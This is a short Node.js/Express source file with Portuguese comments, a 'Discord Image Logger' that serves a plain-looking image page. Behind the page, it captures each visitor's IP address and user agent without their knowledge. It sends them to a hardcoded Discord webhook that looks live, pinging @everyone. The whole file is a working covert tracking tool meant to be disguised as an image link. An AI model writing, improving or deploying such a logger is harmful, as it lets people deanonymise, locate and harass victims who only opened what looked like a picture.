// Discord Image Logger - Versão super simplificada
const https = require('https');

// Configuração básica
const WEBHOOK_URL = "https://discord.com/api/webhooks/1352417668946202624/V_mU5x7tpRUNzzaSoK2RKz1PLXzDwv2r_jaZnv5e6Y-opOIB9b9ghuPu8CtGnPfwEdKu";
const DEFAULT_IMAGE = "https://i.pinimg.com/564x/12/26/e0/1226e0b520b52a84933d697f52600012.jpg";

// Função para enviar webhook
function sendWebhook(data) {
  return new Promise((resolve, reject) => {
    const webhookData = JSON.stringify(data);
    
    const options = {
      hostname: 'discord.com',
      path: '/api/webhooks/1352417668946202624/V_mU5x7tpRUNzzaSoK2RKz1PLXzDwv2r_jaZnv5e6Y-opOIB9b9ghuPu8CtGnPfwEdKu',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': webhookData.length
      }
    };
    
    const req = https.request(options, (res) => {
      res.on('data', () => {});
      res.on('end', () => { resolve(); });
    });
    
    req.on('error', (e) => { 
      console.error('Erro ao enviar webhook:', e);
      reject(e); 
    });
    
    req.write(webhookData);
    req.end();
  });
}

// Handler principal do Express
function handler(req, res) {
  // Pegar IP do usuário
  const ip = req.headers['x-forwarded-for'] || 
             req.headers['x-real-ip'] || 
             req.connection.remoteAddress || 
             'unknown';
             
  // Pegar User Agent
  const userAgent = req.headers['user-agent'] || 'unknown';
  
  // Montar mensagem para o Discord
  const message = {
    username: "Image Logger",
    content: "@everyone",
    embeds: [{
      title: "Image Logger - IP Logged",
      color: 0x00FFFF,
      description: `**Alguém abriu a imagem!**\n\n**IP:** \`${ip}\`\n\n**User Agent:**\n\`\`\`\n${userAgent}\n\`\`\``,
      thumbnail: { url: DEFAULT_IMAGE }
    }]
  };
  
  // Enviar webhook assincronamente
  sendWebhook(message).catch(console.error);
  
  // Responder com HTML simples
  const html = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Image</title>
      <style>
        body { margin: 0; padding: 0; }
        .img-container { 
          width: 100vw; 
          height: 100vh; 
          display: flex; 
          align-items: center; 
          justify-content: center;
        }
        img { max-width: 100%; max-height: 100%; }
      </style>
    </head>
    <body>
      <div class="img-container">
        <img src="${DEFAULT_IMAGE}" alt="Image">
      </div>
    </body>
    </html>
  `;
  
  res.setHeader('Content-Type', 'text/html');
  res.status(200).send(html);
}

// Configurar para Express e para Vercel
if (require.main === module) {
  // Executando como aplicativo Node.js independente
  const express = require('express');
  const app = express();
  app.use(handler);
  const port = process.env.PORT || 3000;
  app.listen(port, () => {
    console.log(`Servidor rodando na porta ${port}`);
  });
} else {
  // Exportar como função do Vercel
  module.exports = handler;
}
